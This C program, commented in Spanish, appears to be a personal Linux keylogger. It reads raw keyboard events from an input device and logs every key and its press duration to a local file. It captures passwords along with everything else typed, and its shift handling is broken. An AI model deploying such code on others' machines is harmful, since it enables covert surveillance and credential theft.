#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <time.h>
#include <string.h>

// Función para obtener el nombre del archivo de log basado en la fecha y hora actuales
char* get_log_filename() {
    time_t t = time(NULL);
    struct tm *tm_info = localtime(&t);
    static char filename[128];
    strftime(filename, 128, "/home/surfacego2/Documentos/keylogger/%d-%m-%Y_%H-%M.txt", tm_info);
    return filename;
}

// Función para convertir el código de la tecla a su nombre
const char* keycode_to_string(int code, int shift) {
    // Mapeo de códigos de teclas a caracteres
    switch (code) {
        case KEY_A: return shift ? "A" : "a";
        case KEY_B: return shift ? "B" : "b";
        case KEY_C: return shift ? "C" : "c";
        case KEY_D: return shift ? "D" : "d";
        case KEY_E: return shift ? "E" : "e";
        case KEY_F: return shift ? "F" : "f";
        case KEY_G: return shift ? "G" : "g";
        case KEY_H: return shift ? "H" : "h";
        case KEY_I: return shift ? "I" : "i";
        case KEY_J: return shift ? "J" : "j";
        case KEY_K: return shift ? "K" : "k";
        case KEY_L: return shift ? "L" : "l";
        case KEY_M: return shift ? "M" : "m";
        case KEY_N: return shift ? "N" : "n";
        case KEY_O: return shift ? "O" : "o";
        case KEY_P: return shift ? "P" : "p";
        case KEY_Q: return shift ? "Q" : "q";
        case KEY_R: return shift ? "R" : "r";
        case KEY_S: return shift ? "S" : "s";
        case KEY_T: return shift ? "T" : "t";
        case KEY_U: return shift ? "U" : "u";
        case KEY_V: return shift ? "V" : "v";
        case KEY_W: return shift ? "W" : "w";
        case KEY_X: return shift ? "X" : "x";
        case KEY_Y: return shift ? "Y" : "y";
        case KEY_Z: return shift ? "Z" : "z";
        case KEY_1: return shift ? "!" : "1";
        case KEY_2: return shift ? "@" : "2";
        case KEY_3: return shift ? "#" : "3";
        case KEY_4: return shift ? "$" : "4";
        case KEY_5: return shift ? "%" : "5";
        case KEY_6: return shift ? "^" : "6";
        case KEY_7: return shift ? "&" : "7";
        case KEY_8: return shift ? "*" : "8";
        case KEY_9: return shift ? "(" : "9";
        case KEY_0: return shift ? ")" : "0";
        case KEY_MINUS: return shift ? "_" : "-";
        case KEY_EQUAL: return shift ? "+" : "=";
        case KEY_LEFTBRACE: return shift ? "{" : "[";
        case KEY_RIGHTBRACE: return shift ? "}" : "]";
        case KEY_BACKSLASH: return shift ? "|" : "\\";
        case KEY_SEMICOLON: return shift ? ":" : ";";
        case KEY_APOSTROPHE: return shift ? "\"" : "'";
        case KEY_GRAVE: return shift ? "~" : "`";
        case KEY_COMMA: return shift ? "<" : ",";
        case KEY_DOT: return shift ? ">" : ".";
        case KEY_SLASH: return shift ? "?" : "/";
        case KEY_SPACE: return " ";
        case KEY_ENTER: return "ENTER";
        case KEY_ESC: return "ESC";
        case KEY_TAB: return "TAB";
        case KEY_CAPSLOCK: return "CAPSLOCK";
        case KEY_F1: return "F1";
        case KEY_F2: return "F2";
        case KEY_F3: return "F3";
        case KEY_F4: return "F4";
        case KEY_F5: return "F5";
        case KEY_F6: return "F6";
        case KEY_F7: return "F7";
        case KEY_F8: return "F8";
        case KEY_F9: return "F9";
        case KEY_F10: return "F10";
        case KEY_F11: return "F11";
        case KEY_F12: return "F12";
        case KEY_LEFTSHIFT: return "LEFTSHIFT";
        case KEY_RIGHTSHIFT: return "RIGHTSHIFT";
        case KEY_LEFTCTRL: return "LEFTCTRL";
        case KEY_RIGHTCTRL: return "RIGHTCTRL";
        case KEY_LEFTALT: return "LEFTALT";
        case KEY_RIGHTALT: return "RIGHTALT";
        case KEY_LEFTMETA: return "LEFTMETA";
        case KEY_RIGHTMETA: return "RIGHTMETA";
        case KEY_NUMLOCK: return "NUMLOCK";
        case KEY_SCROLLLOCK: return "SCROLLLOCK";
        case KEY_UP: return "UP";
        case KEY_DOWN: return "DOWN";
        case KEY_LEFT: return "LEFT";
        case KEY_RIGHT: return "RIGHT";
        case KEY_INSERT: return "INSERT";
        case KEY_DELETE: return "DELETE";
        case KEY_HOME: return "HOME";
        case KEY_END: return "END";
        case KEY_PAGEUP: return "PAGEUP";
        case KEY_PAGEDOWN: return "PAGEDOWN";
        case KEY_PAUSE: return "PAUSE";
        case KEY_PRINT: return "PRINT";
        case KEY_SYSRQ: return "SYSRQ";
        case KEY_BREAK: return "BREAK";
        case KEY_UNKNOWN: return "UNKNOWN";
        default: return "UNKNOWN";
    }
}

// Estructura para almacenar la información de una tecla
typedef struct {
    int code;
    struct timeval press_time;
    int shift_pressed;
} KeyInfo;

// Función principal
int main() {
    // Obtener el nombre del archivo de log
    char* log_file = get_log_filename();

    // Ruta al dispositivo de teclado
    const char *device_path = "/dev/input/event10";

    // Intentar abrir el dispositivo
    int device = open(device_path, O_RDONLY);
    if (device == -1) {
        perror("No se pudo abrir el dispositivo de entrada");
        return EXIT_FAILURE;
    }

    // Estructura para almacenar eventos de entrada
    struct input_event ev;
    KeyInfo key_info = {0};

    printf("Escuchando eventos en %s y registrando en %s\n", device_path, log_file);

    // Bucle para leer eventos del dispositivo
    while (1) {
        ssize_t bytes_read = read(device, &ev, sizeof(struct input_event));
        if (bytes_read > 0) {
            if (ev.type == EV_KEY) {
                if (ev.value == 1) {  // Tecla presionada
                    key_info.code = ev.code;
                    gettimeofday(&key_info.press_time, NULL);

                    // Detectar si se está presionando Shift
                    key_info.shift_pressed = (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT);
                } else if (ev.value == 0) {  // Tecla soltada
                    struct timeval release_time;
                    gettimeofday(&release_time, NULL);

                    // Calcular la duración en milisegundos
                    long duration = (release_time.tv_sec - key_info.press_time.tv_sec) * 1000 +
                                    (release_time.tv_usec - key_info.press_time.tv_usec) / 1000;

                    FILE *log_fp = fopen(log_file, "a");
                    if (log_fp != NULL) {
                        fprintf(log_fp, "Tecla: %s, Duración: %ld ms\n", keycode_to_string(key_info.code, key_info.shift_pressed), duration);
                        fclose(log_fp);
                    } else {
                        perror("No se pudo abrir el archivo de log");
                    }
                }
            }
        } else if (bytes_read == -1) {
            perror("Error al leer del dispositivo");
            close(device);
            return EXIT_FAILURE;
        }
    }

    // Cerrar el dispositivo
    close(device);

    return 0;
}
